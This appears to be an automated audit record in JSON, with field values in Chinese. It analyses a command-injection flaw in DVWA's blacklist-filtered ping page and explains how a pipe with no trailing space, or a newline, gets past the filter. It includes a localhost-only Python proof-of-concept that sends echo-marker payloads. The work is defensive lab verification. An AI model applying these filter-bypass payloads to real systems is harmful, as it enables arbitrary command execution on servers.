@@ -1,0 +1,148 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "CMD-003",
+  "input_version": "v2",
+  "prompt_version": "final",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "CMD-003"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "输入（第4行 $_REQUEST['ip']）、过滤（第6–18行黑名单）、危险操作（第22/26行 shell_exec 拼接）与回显（第29行）在片段内静态可见且首尾相接；黑名单键 '| ' 与 '||' 的具体字面量可从代码逐字核对，绕过所需的 '|' 单独字符确有代码依据。未做运行验证，因此仅置信等级为 high，判定仍为待验证。"
+  },
+  "findings": [
+    {
+      "finding_id": "CMD-003-CMDI-01",
+      "vulnerability_type": "命令注入",
+      "locations": [
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 2,
+          "line_end": 2,
+          "quote": "if( isset( $_POST[ 'Submit' ]  ) ) {"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 4,
+          "line_end": 4,
+          "quote": "$target = trim($_REQUEST[ 'ip' ]);"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 10,
+          "line_end": 10,
+          "quote": "'| ' => '',"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 18,
+          "line_end": 18,
+          "quote": "$target = str_replace( array_keys( $substitutions ), $substitutions, $target );"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 22,
+          "line_end": 22,
+          "quote": "$cmd = shell_exec( 'ping  ' . $target );"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 26,
+          "line_end": 26,
+          "quote": "$cmd = shell_exec( 'ping  -c 4 ' . $target );"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 29,
+          "line_end": 29,
+          "quote": "$html .= \"<pre>{$cmd}</pre>\";"
+        }
+      ],
+      "data_flow": [
+        "第2行：仅当 $_POST['Submit'] 存在时进入片段，因此该入口是 POST 表单提交（按钮 Submit），不是独立 API。",
+        "第4行：$target = trim($_REQUEST['ip'])；$_REQUEST 同时接受 GET/POST/Cookie 的 ip，trim 只去首尾空白，未做 IPv4 语法、字符集或长度校验，任意字符串进入后续流程。",
+        "第7–15行：黑名单数组按 '||','&',';','| ','-','$','(',')','`' 九个键定义替换为空串。",
+        "第18行：str_replace 按数组键顺序做单遍不重叠替换，只删除上述字面量子串；结果不做二次扫描（替换后新拼接出的字符不会被再次检查），也不做白名单校验。",
+        "第20行：php_uname('s') 以 stristr 判断是否含 'Windows NT'，决定拼接哪条命令前缀（第22行或第26行）。",
+        "第22行（Windows）：shell_exec('ping  ' . $target) 直接字符串拼接；第26行（*nix）：shell_exec('ping  -c 4 ' . $target) 同理。输入中的 '|' 若后接非空格字符，不匹配 '| ' 键，保留在最终 shell 字符串中。",
+        "第29行：$cmd 被拼进 \"<pre>{$cmd}</pre>\" 写入 $html；外围处理器把 $html 插入 page['body'] 并调用 dvwaHtmlEcho 输出，是命令回显的观察点。"
+      ],
+      "principle": "命令注入成立的原因是黑名单与 shell 语义不匹配。str_replace 只删除九个固定子串，其中管道项的键是 '| '（管道+一个空格），因此 '127.0.0.1|echo MARKER'（管道后紧跟字符）完全不被替换；此外 '\\n'（换行）根本不在黑名单内，在 *nix 下同样是命令分隔符。拼接后的字符串交给 shell_exec（内部为 /bin/sh -c 或 cmd.exe /c），竖线由解释器当作管道/命令连接符处理，第二段命令以 web 服务账户权限执行。黑名单中 '&'、';'、'||' 被整体删除只挡住这些写法，不能阻断单管道与换行；'-' 被删除会改写带横线的参数，但不影响 echo 这类无横线命令，也不影响命令本身执行。",
+      "impact": "攻击者可在目标主机上以 web 服务账户（DVWA 典型为 www-data 或 IIS 应用池账户）执行任意命令，读取应用配置与数据库凭据、探测内网、破坏文件；本靶场验证只回显固定标记，不进行上述利用。",
+      "preconditions": [
+        "已通过外围处理器建立登录会话；片段入口要求 POST 且带 Submit=Submit，缺少该字段不会进入命令拼接。",
+        "部署难度配置实际加载本片段（黑名单版本 CMD-003.php），而不是另一套严格校验的实现（如 impossible 文件）。",
+        "PHP 未通过 disable_functions 或 suhosin 禁用 shell_exec，且 web 服务账户的 PATH 中存在 ping 可执行文件。",
+        "系统分支由 php_uname('s') 决定：含 'Windows NT' 走第22行，其余走第26行；两分支拼接方式相同，仅前缀不同，POC 需按实际 OS 选择写法。",
+        "片段之外没有额外过滤（如 mod_security/反向代理规则拦截 '|' 或换行）；外围源码未提供，无法确认此项。"
+      ],
+      "counterexamples": [
+        "若 php.ini 的 disable_functions 含 shell_exec，两处调用都不会执行，$cmd 为 null，注入路径不可达。",
+        "若在外围处理器中对 ip 强制校验为合法 IPv4（本片段内未见此逻辑，但外围源码未提供），'|' 与换行会被拒绝。",
+        "若部署为严格校验难度版本（加载另一份带白名单的实现），本片段的拼接路径不被执行。",
+        "以 '127.0.0.1 | echo MARKER'（管道前后都有空格）提交时，'| ' 键命中被删除，字符串退化为 'ping 127.0.0.1 echo MARKER'，ping 报参数/主机错误，标记不出现——说明该写法被挡住，但不能推出所有写法被挡住。",
+        "若目标主机不存在 ping 或网络超时，即使注入成立也观察不到正常 ping 输出；需以标记是否出现为准，不能以 ping 报错作为安全证据。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "Python",
+        "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nCMD-003 -- command-injection verification draft (teaching lab, local only).\n\nEndpoint taken from the audited normalized sample CMD-003.php:\n\n    if ( isset( $_POST['Submit'] ) ) {\n        $target = trim($_REQUEST['ip']);\n        $target = str_replace( <blacklist>, '', $target );\n        if ( stristr( php_uname('s'), 'Windows NT' ) ) {\n            $cmd = shell_exec( 'ping  ' . $target );\n        } else {\n            $cmd = shell_exec( 'ping  -c 4 ' . $target );\n        }\n        $html .= \"<pre>{$cmd}</pre>\";\n    }\n\nThe blacklist removes the literal substrings  ||   &   ;   '| '   -   $   (   )   `\nso this draft never sends any of those substrings.  It chains a second command\nwith a pipe that is NOT followed by a space ('|echo'), which no blacklist entry\ncovers, and -- on *nix only -- with a newline separator, which is not in the\nblacklist at all.\n\nEverything executed on the target is `echo` of ONE fixed marker string.\nNo reverse shell, no file read, no download, no persistence, no change to data.\n\nUsage:\n    python CMD-003_poc.py --base-url http://127.0.0.1 --cookie-file .\\\\cookie.txt\n\nThe cookie file contains a single header value such as\n    PHPSESSID=abc123; security=low\nIt is read from disk and never printed.\n\nOnly localhost / 127.0.0.1 / ::1 are accepted; redirects are refused.\n\nExit codes: 0 = all planned requests completed (judge the printed summary),\n            2 = request/connection/auth problem,\n            3 = refused argument (scheme, host, cookie format).\n\"\"\"\n\nimport argparse\nimport sys\nfrom urllib import error, parse, request\n\nMARKER = \"DSH_MARKER_CMD003\"\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\n\n# label -> value sent as the 'ip' parameter\nPAYLOADS = [\n    (\"baseline_plain_ip\", \"127.0.0.1\"),\n    (\"pipe_no_space\", \"127.0.0.1|echo \" + MARKER),\n    (\"newline_separator_nix\", \"127.0.0.1\\n echo \" + MARKER),\n    (\"control_space_after_pipe\", \"127.0.0.1 | echo \" + MARKER),\n]\n\n\nclass RefuseRedirect(request.HTTPRedirectHandler):\n    \"\"\"Turn every 3xx into an error instead of following it.\"\"\"\n\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise error.HTTPError(\n            req.full_url, code, \"redirect refused: %s\" % newurl, headers, fp\n        )\n\n\ndef build_parser():\n    p = argparse.ArgumentParser(\n        description=\"CMD-003 local teaching-lab verification draft \"\n                    \"(harmless echo marker only).\"\n    )\n    p.add_argument(\"--base-url\", required=True,\n                   help=\"e.g. http://127.0.0.1 or http://127.0.0.1:8080\")\n    p.add_argument(\"--path\", default=\"/vulnerabilities/exec/\",\n                   help=\"form/endpoint path that includes the audited snippet\")\n    p.add_argument(\"--cookie-file\", default=None,\n                   help=\"local file holding one Cookie header value \"\n                        \"(PHPSESSID=<value>; security=<level>)\")\n    p.add_argument(\"--timeout\", type=float, default=15.0)\n    p.add_argument(\"--only\", default=None,\n                   help=\"run one payload by label (default: all)\")\n    return p\n\n\ndef refuse(msg, code=3):\n    sys.stderr.write(\"REFUSED: %s\\n\" % msg)\n    raise SystemExit(code)\n\n\ndef check_url(raw):\n    parts = parse.urlsplit(raw)\n    if parts.scheme not in (\"http\", \"https\"):\n        refuse(\"scheme %r is not http/https\" % parts.scheme)\n    host = (parts.hostname or \"\").strip(\"[]\")\n    if host not in ALLOWED_HOSTS:\n        refuse(\"host %r is not localhost/127.0.0.1/::1\" % host)\n    return raw.rstrip(\"/\")\n\n\ndef load_cookie(path):\n    if not path:\n        return None\n    try:\n        with open(path, \"r\", encoding=\"utf-8\") as fh:\n            raw = fh.read().strip()\n    except OSError as exc:\n        refuse(\"cannot read cookie file: %s\" % exc, 2)\n    if not raw:\n        refuse(\"cookie file is empty\", 2)\n    if \"=\" not in raw:\n        refuse(\"cookie file must contain NAME=VALUE pairs\", 2)\n    return \" \".join(raw.splitlines())\n\n\ndef post(opener, url, value, cookie, timeout):\n    body = parse.urlencode([(\"Submit\", \"Submit\"), (\"ip\", value)])\n    req = request.Request(url, data=body.encode(\"ascii\"), method=\"POST\")\n    req.add_header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    req.add_header(\"User-Agent\", \"cmd003-verify-draft/1.0\")\n    if cookie:\n        req.add_header(\"Cookie\", cookie)\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            return resp.status, resp.read().decode(\"utf-8\", \"replace\")\n    except error.HTTPError as exc:\n        if \"redirect refused\" in str(exc.msg):\n            return exc.code, \"REDIRECT_REFUSED\"\n        try:\n            body_text = exc.read().decode(\"utf-8\", \"replace\")\n        except Exception:\n            body_text = \"\"\n        return exc.code, body_text\n    except error.URLError as exc:\n        return None, \"CONNECTION_ERROR: %s\" % exc.reason\n    except OSError as exc:\n        return None, \"SOCKET_ERROR: %s\" % exc\n\n\ndef pre_blocks(html):\n    blocks = []\n    pos = 0\n    while True:\n        start = html.find(\"<pre>\", pos)\n        if start < 0:\n            return blocks\n        end = html.find(\"</pre>\", start)\n        if end < 0:\n            blocks.append(html[start + 5:])\n            return blocks\n        blocks.append(html[start + 5:end])\n        pos = end + 6\n\n\ndef summarise(html):\n    blocks = pre_blocks(html)\n    joined = \"\\n\".join(blocks)\n    return {\n        \"marker_in_body\": MARKER in html,\n        \"marker_in_pre\": MARKER in joined,\n        \"pre_count\": len(blocks),\n        \"pre_excerpt\": joined.strip()[:600],\n        \"login_form\": (\"name=\\\"username\\\"\" in html.lower()\n                       or \"login.php\" in html.lower()),\n    }\n\n\ndef main(argv):\n    args = build_parser().parse_args(argv)\n    base = check_url(args.base_url)\n    url = base + args.path\n    cookie = load_cookie(args.cookie_file)\n\n    opener = request.build_opener(RefuseRedirect())\n    results = []\n    problems = []\n\n    for label, value in PAYLOADS:\n        if args.only and label != args.only:\n            continue\n        status, body = post(opener, url, value, cookie, args.timeout)\n        if status is None:\n            problems.append(\"%s: %s\" % (label, body))\n            results.append({\n                \"label\": label,\n                \"payload\": value.replace(\"\\n\", \"\\\\n\"),\n                \"http_status\": None,\n                \"error\": body,\n            })\n            continue\n        info = summarise(body)\n        info.update({\n            \"label\": label,\n            \"payload\": value.replace(\"\\n\", \"\\\\n\"),\n            \"http_status\": status,\n        })\n        results.append(info)\n\n    print(\"URL: %s\" % url)\n    print(\"Cookie supplied: %s\" % (\"yes\" if cookie else \"no\"))\n    for item in results:\n        print(\"---\")\n        print(\"label          : %s\" % item.get(\"label\"))\n        print(\"payload        : %r\" % item.get(\"payload\"))\n        print(\"http_status    : %s\" % item.get(\"http_status\"))\n        if item.get(\"error\"):\n            print(\"error          : %s\" % item.get(\"error\"))\n            continue\n        print(\"marker_in_body : %s\" % item.get(\"marker_in_body\"))\n        print(\"marker_in_pre  : %s\" % item.get(\"marker_in_pre\"))\n        print(\"login_form     : %s\" % item.get(\"login_form\"))\n        print(\"pre_excerpt    : %s\" % item.get(\"pre_excerpt\").replace(\"\\n\", \" | \"))\n\n    base_item = next((r for r in results if r.get(\"label\") == \"baseline_plain_ip\"), None)\n    test_items = [r for r in results\n                  if r.get(\"label\") in (\"pipe_no_space\", \"newline_separator_nix\")]\n    control = next((r for r in results\n                    if r.get(\"label\") == \"control_space_after_pipe\"), None)\n\n    if problems:\n        print(\"RESULT: request problem(s); no conclusion about the vulnerability.\")\n        return 2\n    if base_item and base_item.get(\"login_form\") and not base_item.get(\"marker_in_pre\"):\n        print(\"RESULT: the response looks like a login page; supply a valid \"\n              \"session cookie file and retry.\")\n        return 2\n    observed = [r.get(\"label\") for r in test_items if r.get(\"marker_in_pre\")]\n    if observed:\n        print(\"RESULT: MARKER observed for %s -- extra command output appeared \"\n              \"next to ping output.\" % \", \".join(observed))\n        if control is not None:\n            print(\"CONTROL (space after pipe) marker_in_pre: %s\"\n                  % control.get(\"marker_in_pre\"))\n        return 0\n    print(\"RESULT: no marker observed in the <pre> block. This is NOT proof of \"\n          \"safety: check OS branch, ping availability, disable_functions, WAF \"\n          \"and whether the deployed file is this blacklist version.\")\n    return 2\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main(sys.argv[1:]))\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅使用标准库（argparse、sys、urllib）",
+          "可访问的本地 DVWA 实例与有效登录会话 Cookie（由测试人员本地文件提供，不写入版本库）",
+          "目标地址仅限 localhost / 127.0.0.1 / ::1；其他已授权地址需验证人员另行记录范围"
+        ],
+        "parameters": [
+          "--base-url（如 http://127.0.0.1，脚本校验 scheme 与 host）",
+          "--path（默认 /vulnerabilities/exec/，实际路径以部署为准，需人工确认）",
+          "--cookie-file（存放 PHPSESSID 与 security 等 Cookie 头值的本地文件）",
+          "--timeout（默认 15 秒）",
+          "--only（可选，单独运行某个 payload 标签）"
+        ],
+        "steps": [
+          "1. 在本地靶场完成登录，从浏览器导出 Cookie 头值写入本地文件（如 PHPSESSID=<值>; security=low），不提交到仓库。",
+          "2. 运行基线：python CMD-003_poc.py --base-url http://127.0.0.1 --path /vulnerabilities/exec/ --cookie-file ./cookie.txt --only baseline_plain_ip，确认 <pre> 中出现正常 ping 输出且不含标记。",
+          "3. 运行管道载荷：同命令改为 --only pipe_no_space，ip 值为 127.0.0.1|echo DSH_MARKER_CMD003（管道后无空格，避免命中 '| ' 键）。",
+          "4. *nix 部署再运行 --only newline_separator_nix，ip 值为 127.0.0.1 换行 echo DSH_MARKER_CMD003；Windows 部署不套用换行写法，只用管道写法。",
+          "5. 运行对照：--only control_space_after_pipe（ip 为 127.0.0.1 空格 管道 空格 echo MARKER），预期标记被黑名单删除，用于证明差异来自过滤而非偶然回显。",
+          "6. 记录每个请求的 HTTP 状态、<pre> 原文与标记位置；若返回登录页则补会话后重跑。"
+        ],
+        "expected_observation": "基线响应 <pre> 中只有 ping 统计与回复，不含 DSH_MARKER_CMD003；pipe_no_space（及 *nix 的 newline_separator_nix）响应在 <pre> 中同时出现 ping 输出与单独一行 DSH_MARKER_CMD003，证明标记由 shell 解释第二段命令产生而非页面回显；对照 control_space_after_pipe 不出现标记。",
+        "success_criteria": "同一会话、同一路径下，仅 ip 参数不同：基线无标记且管道载荷的 <pre> 中出现标记，同时对照载荷（'| ' 命中黑名单）无标记，三者构成完整对照；若标记只出现在页面其他位置而未进入 <pre>，或仅 HTTP 200 而 <pre> 无变化，均不算成立。",
+        "limitations": "脚本未在本环境运行，属草案；实际路径、DVWA 版本、PHP 版本、shell_exec 配置、会话与 token 均需人工适配；Windows 分支未提供换行写法，因为 cmd.exe 对命令行内换行的处理依赖调用方式，不做无依据断言；响应判定依赖 <pre> 结构，若页面模板不同需调整。",
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "外围处理器源码（context/ 目录）未提供，无法确认片段包含条件、登录会话校验与是否存在额外输入过滤。",
+    "dvwaPage.inc.php 的渲染逻辑未提供，仅知 $html 进入 page['body'] 后由 dvwaHtmlEcho 输出。",
+    "部署的难度配置与具体加载文件未提供，无法确认本片段（黑名单版本）就是运行时生效的实现。",
+    "PHP 版本、disable_functions、shell_exec 是否启用、ping 是否存在及其权限未实测。",
+    "运行操作系统与 shell（/bin/sh、cmd.exe）未提供，Windows 与 *nix 分支只能分别列出。",
+    "认证状态、CSRF token 与 Cookie 来源未提供，POC 的会话参数需人工补齐。"
+  ],
+  "risk_notes": [
+    "命令输出被原样放入 <pre> 且未做 HTML 转义，若被注入内容影响输出，可能引出反射型 XSS；属本次范围外风险。",
+    "黑名单逐字符删除会改变输入语义（如删除 '-'），可能造成误判为“已过滤”，属于防护设计缺陷而非独立漏洞。",
+    "命令执行结果可能包含主机名、内网地址等信息，教学环境应限制访问来源并避免在共享环境运行。"
+  ],
+  "quality_notes": [
+    "使用 $_REQUEST 读取 ip，而表单声明为 POST，扩大了输入面（GET/Cookie 同样可控）。",
+    "以黑名单替换代替 escapeshellarg/escapeshellcmd 或参数数组式无 shell 调用，属不安全的命令构造方式。",
+    "命令字符串中 'ping  ' 与 'ping  -c 4 ' 存在多余空格，说明模板拼接未经参数化设计。",
+    "str_replace 的单遍替换无二次校验，替换顺序与键的重叠（'||' 与 '|'）依赖数组顺序，维护易错。"
+  ],
+  "limitations": [
+    "结论基于单文件静态片段，未包含外围处理器的可达性与认证实现，路径可达性依赖外围源码补证。",
+    "未运行任何请求，verdict 保持待验证；不能以 POC 草案或语法检查替代实测。",
+    "Windows 与 *nix 分支的利用写法分别给出，未在真实主机上验证任一分支。",
+    "无法判断部署实例是否启用 WAF 或 disable_functions，环境差异可能改变结论。"
+  ],
+  "runtime_evidence": []
+}
